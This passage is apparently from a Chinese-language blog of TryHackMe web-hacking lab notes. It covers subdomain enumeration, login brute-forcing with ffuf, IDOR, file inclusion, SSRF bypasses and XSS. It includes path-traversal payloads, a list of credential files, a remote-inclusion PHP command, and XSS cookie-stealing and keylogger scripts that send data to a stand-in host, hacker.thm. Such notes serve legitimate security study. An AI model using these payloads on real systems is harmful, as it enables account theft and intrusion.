stylus">-site:www<span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span> site：*<span class="hljs-selector-class">.domain</span>.com<br></code></pre></td></tr></table></figure><p>上面的意思把<a href="http://www.domain.com这个域名给丢掉/">www.domain.com这个域名给丢掉</a> 然后匹配其他的域名</p><p>3.DNS暴力破解</p><p>可以使用一些工具对域名进行暴力破解 例如dnsrecon</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041735401.png" alt="image-20240304173544295"></p><p>-d指定了域名 -t brt指定了执行模式</p><p>上面是它自带的字典应该 然后我们实际情况要用的话 需要指明字典的位置</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041755996.png" alt="image-20240304175505891"></p><p>还有其他的工具 比如 **Sublist3r **是用python写的</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041800461.png" alt="image-20240304180036303"></p><p>4.Virtual Host(虚拟主机)</p><p>某些子域并不总是托管在可公开访问的 DNS 结果中，例如 Web 应用程序或管理门户的开发版本。相反，DNS 记录可以保存在专用 DNS 服务器上，也可以记录在开发人员计算机上的 /etc/hosts 文件（或 Windows 用户的 c：\windows\system32\drivers\etc\hosts 文件）中，该文件将域名映射到 IP 地址。</p><p>由于当从客户端请求网站时，Web 服务器可以从一台服务器承载多个网站，因此服务器可以从 Host 标头中知道客户端需要哪个网站 。我们可以通过对它进行更改并监控响应来利用此主机标头，以查看我们是否发现了一个新网站。</p><p>我们可以利用ffuf来实现这个功能</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>SecLists<span class="hljs-regexp">/Discovery/</span>DNS/namelist.txt -H <span class="hljs-string">&quot;Host: FUZZ.acmeitsupport.thm&quot;</span> -u ip地址 -fs &#123;<span class="hljs-keyword">size</span>&#125;<br></code></pre></td></tr></table></figure><p>来解释一下指令 -w是指定了字典文件 -H是指定了Host的信息 -u是指定url地址 后面的 -fs是一个过滤器 {size}是size出现次数最多的值</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041858085.png" alt="image-20240304185824992"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041858894.png" alt="image-20240304185842721"></p><p>总结:主要介绍了一些收集子域的方法</p><h3 id="Authentication-Bypass-身份验证绕过"><a href="#Authentication-Bypass-身份验证绕过" class="headerlink" title="Authentication Bypass(身份验证绕过)"></a>Authentication Bypass(身份验证绕过)</h3><p> 1.用户名枚举</p><p>验证哪些用户名是已经存在的 但是我们不知道其密码的</p><p>这里可以利用ffuf进行验证 除此之外 我们还可以利用burpsuite进行验证 </p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">ffuf -w &#x27;<span class="hljs-string">/home/kali/</span>桌面<span class="hljs-string">/yhm.txt</span>&#x27; -X POST -d <span class="hljs-string">&quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot;</span> -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -u <span class="hljs-string">&quot;http://10.10.70.227/customers/signup&quot;</span> -mr <span class="hljs-string">&quot;username already exists&quot;</span><br></code></pre></td></tr></table></figure><p>-w 是指定的字典 然后-X是传参的方式 -d是传入的内容 FUZZ的地方就是字典进行爆破的地方 然后-H就是指定一下Content-Type的类型 -u指定url -mr是指定 当注册已经存在的用户时出现的一些错误信息</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042153730.png" alt="image-20240304215307566"></p><p>好的字典很重要</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042204727.png" alt="image-20240304220432569"></p><p>2.暴力破解</p><p>还是利用爆破 </p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tp">ffuf -w <span class="hljs-string">&#x27;/home/kali/桌面/user.txt&#x27;</span>:<span class="hljs-keyword">W</span><span class="hljs-number">1</span>,<span class="hljs-string">&#x27;/home/kali/桌面/password.txt&#x27;</span>:<span class="hljs-keyword">W</span><span class="hljs-number">2</span> -<span class="hljs-keyword">X</span> POST -d <span class="hljs-string">&quot;username=W1&amp;password=W2&quot;</span> -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -u <span class="hljs-string">&quot;http://10.10.70.227/customers/login&quot;</span> -fc <span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><p>fc 200 是只返回响应包为200的</p><p>3.逻辑缺陷</p><p>有时身份验证过程包含逻辑缺陷。逻辑缺陷是指应用程序的典型逻辑路径被黑客绕过、规避或操纵。逻辑缺陷可能存在于网站的任何区域，但在这种情况下，我们将专注于与身份验证相关的示例。</p><p>比如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( url.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-number">0</span>,<span class="hljs-number">6</span>) === <span class="hljs-string">&#x27;/admin&#x27;</span>) &#123;<br>    <span class="hljs-comment"># Code to check user is an admin</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment"># View Page</span><br>&#125;<br></code></pre></td></tr></table></figure><p>该代码的功能是 检查访问路径是否以admin开头 如果是的话就检查用户是不是admin 否则的话就显示其他的</p><p>然而当我们访问/adMin时就会绕过该检查 从而造成一个逻辑缺陷</p><p> 最后就是thm的这个逻辑缺陷的利用了 </p><p>首先我们先到遗忘密码那里，然后它让输入与之关联的邮箱地址 这里thm给了一个 然后接着又让我们输入用户名 最后它会把密码发送到之前的邮箱里面去</p><p>因为发送email使用的是get传参 而发送username是post传参 这里我们都改成request传参 此时它会偏向于post的传入值 所以我们可以在post那里传入email的值 从而可以控制email的发送地址</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042336559.png" alt="image-20240304233657364"></p><p>根据这个思路 我们先去网站注册一个账号 然后把emial地址改为我们注册的值 (可以在bp发送)</p><p>然后我们在注册的界面等待</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042349941.png" alt="image-20240304234947866"></p><p>会有一个密码修改的提示 有一个登录的链接 然后登录即可</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042351063.png" alt="image-20240304235146873"></p><p>4.通过cookie进行登录绕过</p><p>存放hash的数据库的相关网站:<a href="https://crackstation.net/">CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.</a></p><p>有的时候cookie那里会存放一些hash的值 这个时候我们可以去上面的网站上寻找一下 看是否能够解出来</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052037397.png" alt="image-20240305203727159"></p><p>总结：介绍了几种绕过身份验证的方法</p><h3 id="IDOR-越权"><a href="#IDOR-越权" class="headerlink" title="IDOR (越权)"></a>IDOR (越权)</h3><p>是一个未经授权访问的漏洞</p><p> 有的时候我们在查看个人信息的时候 如果上方的url地址中有id=xxx（xxx为数字）的话 如果更改数字的信息会出现他人的信息的话 那么就是一个idor漏洞</p><p>上面只是最直接的 下面是一些变形</p><ol><li>在编码的ID中查找IDOR</li></ol><p>有的时候是基于base64进行编码的 然后我们先解码 将id后面的数字进行一个修改 接着进行编码后再发送到web服务器中 查看信息是否发生变化</p><p>2.在哈希ID中查找IDOR</p><p>同理 不再解释</p><p>3.在不可预测的 ID 中查找 IDOR</p><p>如果 使用上述方法无法检测到 Id，这是一种极好的方法 的IDOR检测是创建两个帐户并交换ID号 在他们之间。如果您可以使用其他用户的 ID 查看其内容 数字，同时仍然使用其他帐户登录（或不登录 已登录），您发现了一个有效的 IDOR 漏洞。</p><p>实例</p><p>我们先注册一个账号 然后在网络那里进行查看</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052120774.png" alt="image-20240305212022659"></p><p>可以看到它是将用户信息以json的形式返回的</p><p>然后我们更改id的信息 可以看到其他用户的用户名和邮箱</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052122057.png" alt="image-20240305212250867"></p><p>总结：这个房间介绍了关于IDOR漏洞的利用</p><h3 id="File-Inclusion-文件包含"><a href="#File-Inclusion-文件包含" class="headerlink" title="File Inclusion (文件包含)"></a>File Inclusion (文件包含)</h3><p>文件包含产生的原因:没有对用户的输入产生一个严格的控制 导致输入在具有文件包含功能函数的地方产生漏洞</p><p>1.路径遍历</p><p>通常是读取服务器上的一些文件</p><p>当用户的输入传递给 PHP 中的 file_get_contents 等函数时，就会发生路径遍历漏洞。需要注意的是，该函数不是导致该漏洞的主要因素。通常，较差的输入验证或筛选是导致漏洞的原因。 在 PHP 中，您可以使用file_get_contents来读取文件的内容</p><p>可以通过../../../../../../目录遍历来读取我们想要读取的内容</p><p>不过有的时候会增加一些过滤器 来防止读取相关的文件</p><p>下面是一些常见的 </p><table><thead><tr><th>位置</th><th>描述</th></tr></thead><tbody><tr><td>/etc/issue</td><td>包含要在登录提示之前打印的消息或系统标识。</td></tr><tr><td>/etc/profile</td><td>控制系统范围的默认变量，例如导出变量、文件创建掩码 （umask）、终端类型、邮件消息，以指示新邮件何时到达</td></tr><tr><td>/proc/version</td><td>指定 Linux 内核的版本</td></tr><tr><td>/etc/passwd</td><td>拥有有权访问系统的所有注册用户</td></tr><tr><td>/etc/shadow</td><td>包含有关系统用户密码的信息</td></tr><tr><td>/root/.bash_history</td><td>包含 root 用户的历史记录命令</td></tr><tr><td>/var/log/dmessage</td><td>包含全局系统消息，包括系统启动期间记录的消息</td></tr><tr><td>/var/mail/root</td><td>root 用户的所有电子邮件</td></tr><tr><td>/root/.ssh/id_rsa</td><td>服务器上 root 用户或任何已知有效用户的私有 SSH 密钥</td></tr><tr><td>/var/log/apache2/access.log</td><td>对 Apache Web 服务器的访问请求</td></tr><tr><td>C:\boot.ini</td><td>包含带有 BIOS 固件的计算机的启动选项</td></tr></tbody></table><p>2.本地文件包含 (LFI)</p><p>与之相关的函数 include require include_once require_once </p><p>thm给的演示是用php来的 然后还有其他编程语言的LFI</p><p>有的时候我们是进行黑盒测试的 并没有源码 然后我们就可以观察错误信息 来以此获取相关信息</p><p>在php5.3.4版本以下 当include函数是(include “”.php) 后面自动添加.php时 这个时候我们就可以利用%00来绕过 即../../../../etc/passwd%00 这个时候就能读取/etc/passwd了.</p><p>还有的就是把../给禁止了 然后我们就可以利用双层的绕过 即 ….//….//….// 这种类型的绕过</p><p>原因如下图所示:</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052303260.png" alt="image-20240305230323091"></p><p>3.远程文件包含 (RFI)</p><p>使用前提是 allow_url_fopen 打开</p><p>我们可以在自己的服务器上面部署恶意文件 然后包含到服务端 即可触发漏洞 原因同样是对用户的输入没有进行严格的过滤 这个远程包含的危害比较大一点</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png" alt="img"></p><p>下面是一些修复的方法:</p><p>1.把一些危险的函数给禁止</p><p>2.把报错信息给关闭</p><p>3.使用白名单</p><p>4.对用户的输入进行严格的过滤 部署waf</p><p>5.使用新的服务 防止一些老版本的漏洞</p><p>LFI测试步骤</p><ol><li>找到一个可以通过 GET、POST、COOKIE 或 HTTP 标头值的入口点！</li><li>输入有效的输入以查看 Web 服务器的行为方式。</li><li>输入无效的输入，包括特殊字符和常用文件名。</li><li>不要总是相信您在输入表单中提供的内容是您想要的！使用浏览器地址栏或 Burpsuite 等工具。</li><li>在输入无效输入时查找错误，以显示 Web 应用程序的当前路径;如果没有错误，那么试错可能是您的最佳选择。</li><li>了解输入验证以及是否有任何过滤器！</li><li>尝试注入有效条目以读取敏感文件</li></ol><p>挑战:</p><p>flag1:</p><p>换成post进行传参即可</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052342400.png" alt="image-20240305234238278"></p><p>flag2:</p><p>这个文件包含点在那个cookie那里 然后后面需要用%00把.php后缀给过滤掉</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052345553.png" alt="image-20240305234534377"></p><p>flag3:</p><p>这一问我是试了有一会 先观察报错信息</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052359232.png" alt="image-20240305235913020"></p><p>差不多是把上面的给结合起来了</p><p>然后我在get传参那里用的….//….//….//….//etc/passwd%00 没过去 后来换了传参方式才可以的  这里的话我觉得是因为它是用$_REQUESTS 接受http的 然后post传入相同的值时 post会把get的给覆盖掉 (更偏向于post)</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403060000247.png" alt="image-20240306000037116"></p><p>然后剩下的这个远程文件包含 写个一句话 然后连接到网站上面 让其包含就行了</p><p>来说一下具体的步骤 首先 我们在要共享文件的目录下开启一个http服务</p><p>python3 -m http.server</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061322574.png" alt="image-20240306132215417"></p><p>然后再对应的目录下创建一个txt文件(php文件也可以) 里面写入 <?php echo system('hostname');?></p><p>然后再去进行一个文件包含</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061323942.png" alt="image-20240306132358783"></p><p>总结:介绍了文件包含的一些内容 以及一些简单的绕过方法</p><h3 id="Intro-to-SSRF-SSRF漏洞"><a href="#Intro-to-SSRF-SSRF漏洞" class="headerlink" title="Intro to SSRF(SSRF漏洞)"></a>Intro to SSRF(SSRF漏洞)</h3><p>ssrf是服务器端请求伪造 允许恶意用户导致Web服务器向攻击者选择的资源发出额外或编辑的HTTP请求。 分为两类 一种是有回显的ssrf 一种是没回显的ssrf</p><p>造成的危险:</p><p>1.探测内网</p><p>2.进入未授权的区域</p><p>3.访问客户/组织数据</p><p>4.显示身份验证令牌/凭据</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061350512.png" alt="image-20240306135047331"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061728058.png" alt="image-20240306172822996"></p><p>原因是服务端遇见了&amp; 可能会造成一个解析错误 会误认为到这里就结束了 然后后面的url就没有用了</p><p>1.查找ssrf</p><p>下面是常见ssrf的示例:</p><p><strong>在地址栏的参数中使用完整 URL 时：</strong></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/956e1914b116cbc9e564e3bb3d9ab50a.png" alt="img"></p><p><strong>表单中的隐藏字段：</strong></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/237696fc8e405d25d4fc7bbcc67919f0.png" alt="img"></p><p><strong>部分 URL，例如主机名：</strong></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f3c387849e91a4f15a7b59ff7324be75.png" alt="img"></p><p><strong>或者可能只是 URL 的路径：</strong></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3fd583950617f7a3713a107fcb4cfa49.png" alt="img"></p><p>对于那些无回显的sssrf来说 可以使用requestbin.com 来显示返回的结果(感觉就是一个dns外带的)    或者是在自己的服务器上面显示</p><p>2.绕过</p><p>拒绝列表:</p><p>对于那些localhost (127.0.0.1)的绕过 通常可以使用特殊数字来进行绕过 </p><p>（如 0、0.0.0.0、0000、127.1、127.<em>.</em>.*、2130706433、017700000001）或具有解析为 IP 地址 127.0.0.1 的 DNS 记录（如 127.0.0.1.nip.io）的子域来绕过拒绝列表。</p><p>此外，在云环境中，阻止对 IP 地址 169.254.169.254 的访问将是有益的，该地址包含已部署云服务器的元数据，包括可能的敏感信息。攻击者可以通过在自己的域上注册一个子域，并使用指向 IP 地址 169.254.169.254 的 DNS 记录来绕过此漏洞。</p><p>允许列表:</p><p>允许列表是指所有请求都被拒绝，除非它们出现在列表中或与特定模式匹配，例如参数中使用的 URL 必须以 <a href="https://website.thm/">https://website.thm</a> 开头的规则<strong>。</strong> 攻击者可以通过在攻击者的域名上创建子域（如 <a href="https://website.thm.attackers-domain.thm)来快速规避此规则.应用程序逻辑现在将允许此输入,并允许攻击者控制内部/">https://website.thm.attackers-domain.thm）来快速规避此规则。应用程序逻辑现在将允许此输入，并允许攻击者控制内部</a> HTTP 请求。</p><p>打开重定向</p><p>如果上述绕过不起作用，攻击者还有一个技巧，即开放重定向。开放重定向是服务器上的一个端点，网站访问者会自动重定向到另一个网站地址。以链接 <a href="https://website.thm/link?url=https://tryhackme.com">https://website.thm/link?url=https://tryhackme.com</a> 为例。创建此端点是为了记录访问者出于广告/营销目的点击此链接的次数。但想象一下，存在一个潜在的 SSRF 漏洞，其严格的规则只允许以 <a href="https://website.thm/">https://website.thm/</a> 开头的 URL。攻击者可利用上述功能将内部 HTTP 请求重定向到攻击者选择的域。</p><p>实例:</p><p>首先我们先注册用户 然后找到头像更换这里</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061955791.png" alt="image-20240306195524628"></p><p>正常更换是可以的，然后我们在更换头像这里在前端找到相关点</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061957627.png" alt="image-20240306195734519"></p><p>value值可以更换成我们想要的 直接换成private是不行的 </p><p>然后可以利用目录遍历来进行替换 xx/../private</p><p>然后再网页源码中 找到相关信息</p><h3 id="Cross-site-Scripting-XSS"><a href="#Cross-site-Scripting-XSS" class="headerlink" title="Cross-site Scripting (XSS)"></a>Cross-site Scripting (XSS)</h3><p>1.xss有效负载</p><p>有效负载就是我们在目标计算机中插入的javascript代码</p><p>最简单的验证是否存在xss漏洞如下:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>还有就是获取cookie值 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">会话窃取：<br>&lt;script&gt;<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://hacker.thm/steal?cookie=&#x27;</span> + <span class="hljs-title function_">btoa</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>));&lt;/script&gt;   <br>上面是经过base64编码过后的<br>&lt;script&gt;<span class="hljs-title function_">alert</span>(documnet.<span class="hljs-property">cookie</span>)&lt;<span class="hljs-regexp">/script&gt;   /</span><span class="hljs-regexp">/这个是不经过编码的</span><br></code></pre></td></tr></table></figure><p><strong>键盘记录器：</strong></p><p>下面的代码充当键盘记录器。这意味着您在网页上输入的任何内容都将被转发到黑客控制下的网站。如果有效负载安装在接受的用户登录名或信用卡详细信息上的网站，这可能会非常具有破坏性。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-property">onkeypress</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123; <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://hacker.thm/log?key=&#x27;</span> + <span class="hljs-title function_">btoa</span>(e.<span class="hljs-property">key</span>) );&#125;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>业务逻辑：</strong></p><p>此有效负载比上述示例具体得多。这将是关于调用特定的网络资源或 JavaScript 函数。例如，假设一个用于更改用户电子邮件地址的 JavaScript 函数，称为 .有效负载可能如下所示：<code>user.changeEmail()</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;user.<span class="hljs-title function_">changeEmail</span>(<span class="hljs-string">&#x27;attacker@hacker.thm&#x27;</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>2.反射型xss</p><p>产生原因:</p><p>在http请求中当用户的数据在网页中未做任何验证时 就会触发反射型xss</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072020920.png" alt="image-20240307202047691"></p><p>如何测试反射的xss:</p><ul><li>URL 查询字符串中的参数</li><li>URL 文件路径</li><li>有时是 HTTP 标头（尽管在实践中不太可能被利用）</li></ul><p>3.存储的xss</p><p>存储在web服务器内部 当用户访问时进行触发</p><p>一般出现在评论区的地方 有的时候检测不严 就可能会造成存储型的xss</p><p>如何测试存储型的xss:</p><p>您需要测试每个可能的入口点，其中似乎存储了数据，然后在其他用户有权访问的区域中显示回来;其中的一个小例子可能是</p><ul><li>在博客上的评论</li><li>用户配置文件信息</li><li>网站列表</li></ul><p>4.基于DOM的xss</p><p>什么是DOM？</p><p>DOM 代表 <strong>D</strong>ocument <strong>O</strong>bject <strong>M</strong>odel，是一个 HTML 和 XML 文档的编程接口。它表示页面，以便程序可以更改文档结构、样式和内容。一个 网页是一个文档，此文档可以显示在浏览器窗口中，也可以作为 HTML 源显示。HTML DOM 的图表是 如下所示：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png" alt="img"></p><p>进一步了解DOM 可以参考:<a href="https://www.w3.org/">https://www.w3.org/</a></p><p>利用DOM：</p><p>DOM的xss是直接在浏览器中执行的 并不会将数据提交给后端</p><p><strong>如何测试基于 Dom 的 XSS：</strong></p><p>基于 DOM 的 XSS 可能具有挑战性，并且需要一定的 JavaScript 知识才能读取源代码。您需要查找访问攻击者可以控制的某些变量（例如“<strong>window.location.x</strong>”参数）的代码部分。</p><p>当你找到这些代码时，你需要看看它们是如何处理的，以及这些值是否曾经被写入网页的 DOM 或传递给不安全的 JavaScript 方法，如 <strong>eval（）。</strong></p><p>5.盲注xss</p><p>就是我们并不会从明面上收到xss执行成功的结果 查看执行结果需要借助其他的工具</p><p><a href="https://github.com/mandatoryprogrammer/xsshunter-express">GitHub - mandatoryprogrammer/xsshunter-express: An easy-to-setup version of XSS Hunter. Sets up in five minutes and requires no maintenance!</a> </p><p>如何测试盲注XSS：</p><p>我们需要设置正确的payload 然后通过http等来返回结果 以此来查看是否执行成功  盲注xss和存储型xss差不多 </p><p>6.完善有效payload</p><p>要是有出现xss的地方 我们可以查看插入地方的页面源代码 根据标签来进行相关绕过</p><p>level 1:</p><p>最基本的payload即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;thm&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>script&gt;<br></code></pre></td></tr></table></figure><p>level2:</p><p>记得闭合</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;THM&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&lt;&quot;<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072208714.png" alt="image-20240307220828518"></p><p>level 3:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;THM&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></td></tr></table></figure><p>主要是有一个</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;textarea&gt;</span><br></code></pre></td></tr></table></figure><p> 把javascript代码当成普通文本了 然后我们通过把</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;textarea&gt;</span><br></code></pre></td></tr></table></figure><p>给闭合掉 就可以绕过这一点</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072223498.png" alt="image-20240307222307327"></p><p>level 4:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">&#x27;;<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-symbol">&#x27;THM</span>&#x27;)<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072234171.png" alt="image-20240307223418032"></p><p>我们还是查看网页源代码 找相对应的点 然后闭合’; 后面的// 是为了把原本的给注释掉</p><p>levl 5:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ScIPt</span>&gt;</span>alert(&#x27;THM&#x27;)<span class="hljs-tag">&lt;/<span class="hljs-name">SciPt</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这是把script给过滤了 </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072240813.png" alt="image-20240307224015727"></p><p>level 6:</p><p>这个的话是利用了img标签的其他属性</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/images/</span>cat.jpg<span class="hljs-string">&quot;onload=&quot;</span>alert(<span class="hljs-string">&#x27;THM&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072247655.png" alt="image-20240307224756487"></p><p>然后thm给了一个 一个payload通关的：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">jaVasCript:<span class="hljs-comment">/*-/*`/*\`/*&#x27;/*&quot;/**/</span>(<span class="hljs-comment">/* */</span>onerror=alert(<span class="hljs-string">&#x27;THM&#x27;</span>) )<span class="hljs-regexp">//%0D%0A%0d%0a//</span>&lt;<span class="hljs-regexp">/stYle/</span>&lt;<span class="hljs-regexp">/titLe/</span>&lt;<span class="hljs-regexp">/teXtarEa/</span>&lt;<span class="hljs-regexp">/scRipt/</span>--!&gt;<span class="hljs-string">\x3csVg/&lt;sVg/oNloAd=alert(&#x27;THM&#x27;)//&gt;\x3e</span><br></code></pre></td></tr></table></figure><p>7.盲打xss实例：</p><p>首先我们先注册一个账号 然后我们在</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072322533.png" alt="image-20240307232232286"></p><p>这个地方进行xss</p><p>然后查看网页源代码的话 我们把<img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072323320.png" alt="image-20240307232331171"></p><p>这个给闭合掉 </p><p>所以payload为:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;THM&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这仅仅是一个思路 然后我们可以通过监听来获取cookie的值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;<span class="hljs-regexp">/textarea&gt;&lt;script&gt;fetch(&#x27;https:/</span><span class="hljs-regexp">/hacker.thm:port?cookie=&#x27; + btoa(document.cookie));&lt;/</span>script&gt;   <br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403081021326.png" alt="image-20240308102108056"></p><p>在本地的话 开启一个python的http服务 然后端口改成8000即可</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403081045437.png" alt="image-20240308104554138"></p><p>(这个我做的时候有点小bug，session值不对)</p><h3 id="Command-Injection-命令注入"><a href="#Command-Injection-命令注入" class="headerlink" title="Command Injection(命令注入)"></a>Command Injection(命令注入)</h3><p>命令执行 